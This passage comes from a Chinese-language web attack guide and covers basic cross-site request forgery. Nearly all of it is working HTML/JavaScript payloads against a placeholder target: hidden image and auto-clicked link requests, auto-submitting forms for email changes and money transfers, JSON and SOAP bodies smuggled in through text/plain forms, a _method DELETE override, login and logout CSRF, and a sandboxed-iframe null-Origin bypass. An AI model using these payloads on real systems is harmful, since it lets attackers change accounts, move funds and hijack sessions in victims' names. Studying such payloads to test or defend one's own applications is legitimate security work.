## 三、基础利用技术（全请求类型）

### 3.1 GET请求CSRF
```html
<!-- 图像标签（自动加载，Lax下顶级子资源请求不携带Cookie——注意GET型漏洞需是顶级导航或同站） -->
<img src="https://target.com/api/delete?id=123" style="display:none">

<!-- 顶级导航GET（Lax默认允许携带Cookie，这是Lax下最核心的GET CSRF载体） -->
<a href="https://target.com/api/delete?id=123" id="cs"></a>
<script>document.getElementById('cs').click();</script>

<!-- window.open / location.href 同为顶级导航 -->
<script>window.open('https://target.com/logout');</script>

<!-- meta refresh（顶级导航） -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/delete?id=123">

<!-- link prefetch（Chrome会在空闲时预取） -->
<link rel="prefetch" href="https://target.com/api/transfer?to=attacker&amount=10000">

<!-- CSS background（no-cors子资源，Lax下不携带Cookie，需目标无SameSite或None） -->
<style>body{background:url(https://target.com/api/delete?id=123)}</style>
```

### 3.2 POST表单CSRF（urlencoded）
```html
<!-- 自动提交表单 -->
<html><body>
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="<EMAIL-REDACTED>">
  <input type="hidden" name="confirm" value="<EMAIL-REDACTED>">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>

<!-- 多参数+自动提交 -->
<form id="p" action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="account" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="currency" value="USD">
</form>
<script>document.p.submit();</script>
```

### 3.3 multipart/form-data CSRF（文件上传等场景）
```html
<form id="f" action="https://target.com/api/upload-avatar" method="POST" enctype="multipart/form-data">
  <!-- 浏览器不允许JS预填充file input；但若上传接口接受filename以外的字段即可直接攻击 -->
  <input type="text" name="description" value="pwned">
</form>
<script>document.f.submit();</script>
<!-- 注：攻击者无法用纯HTML伪造文件内容（需用户交互或XSS），但"上传配置/覆盖已存在文件"类接口若接受URL参数则不受此限 -->
```

### 3.4 JSON CSRF
```html
<!-- 方法1：enctype=text/plain（服务器容忍时，不触发预检，跨站POST可带表单体） -->
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input name='{"email":"<EMAIL-REDACTED>","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- 实际提交body: {"email":"<EMAIL-REDACTED>","x":"="} -->
<!-- 变体：服务器若不校验Content-Type只解析body，可构造合法JSON -->

<!-- 方法2：JSON前加前缀绕过（XSSI防御反噬） -->
<!-- 若服务端JSON解析器容忍 `)]}'\n` 等前缀（Spring/部分老框架），可配合text/plain提交 -->

<!-- 方法3：Flash/Silverlight跨域请求（老浏览器，依赖crossdomain.xml允许*） -->
<object type="application/x-shockwave-flash" data="csrf.swf">
  <param name="flashvars" value="url=https://target.com/api&json={...}">
</object>

<!-- 方法4：CORS错误配置（见第九章）-->

<!-- 方法5：表单+FormData跨域（fetch的no-cors会剥离自定义头，仅限无头校验接口） -->
```

### 3.5 PUT/DELETE/PATCH方法覆盖
```html
<!-- 隐藏方法参数（Spring/Rails/Laravel/Symfony/Express常见） -->
<form action="https://target.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>

<!-- 另见6.x：_method=GET绕过Lax与"仅校验POST"逻辑的复合攻击 -->
```
`X-HTTP-Method-Override`、`X-Method-Override` Header 通过纯form无法发送，需CORS/Flash/SW。

### 3.6 Login CSRF
```html
<!-- 攻击者已知账户密码，诱导受害者登录攻击者账户 -->
<form action="https://target.com/login" method="POST" id="f">
  <input type="hidden" name="username" value="attacker_acct">
  <input type="hidden" name="password" value="attacker_pwd">
</form>
<script>document.f.submit();</script>
<!-- 危害：受害者在攻击者账户内输入信用卡/个人隐私 → 攻击者可查 -->
<!-- 注意：登录接口通常无CSRF Token（自己实现或OAuth），成功率极高 -->
```
**进阶（会话固定变体）：**
```
若登录后服务端"沿用已有session id"（未轮换），攻击者先取得一个合法session id并预置到受害者Cookie（子域/CRLF注入），受害者登录后该session变为认证态，攻击者直接使用 → 无需受害者输入任何敏感信息即可接管
```

### 3.7 Logout CSRF
```html
<!-- 强制登出（DoS）或配合钓鱼 -->
<img src="https://target.com/logout">
<a href="https://target.com/logout" id="l"></a><script>l.click()</script>
<!-- 现代浏览器Lax下GET顶级导航可携带Cookie，注销接口基本必中 -->
<!-- 链式价值：受害者做敏感操作时被登出→诱导重新登录→密码/凭据钓鱼 -->
```

### 3.8 SOAP/XML CSRF
```html
<form action="https://target.com/soap/service" method="POST" enctype="text/plain">
  <input name='<?xml version="1.0"?><soap:Envelope><soap:Body><ResetPassword><email><EMAIL-REDACTED></email></ResetPassword></soap:Body></soap:Envelope><!--' value='-->'>
</form>
<script>document.forms[0].submit();</script>
```

### 3.9 iframe sandbox + null Origin绕过
```html
<!-- iframe sandbox时Origin为null；若后端接受Origin:null则绕过Origin校验 -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form action='https://target.com/api/action' method='POST'>
<input type='hidden' name='x' value='y'>
</form>
<script>document.forms[0].submit();</script>
"></iframe>
<!-- 变体：<iframe sandbox="allow-forms"> 无allow-scripts也可提交表单 -->
```

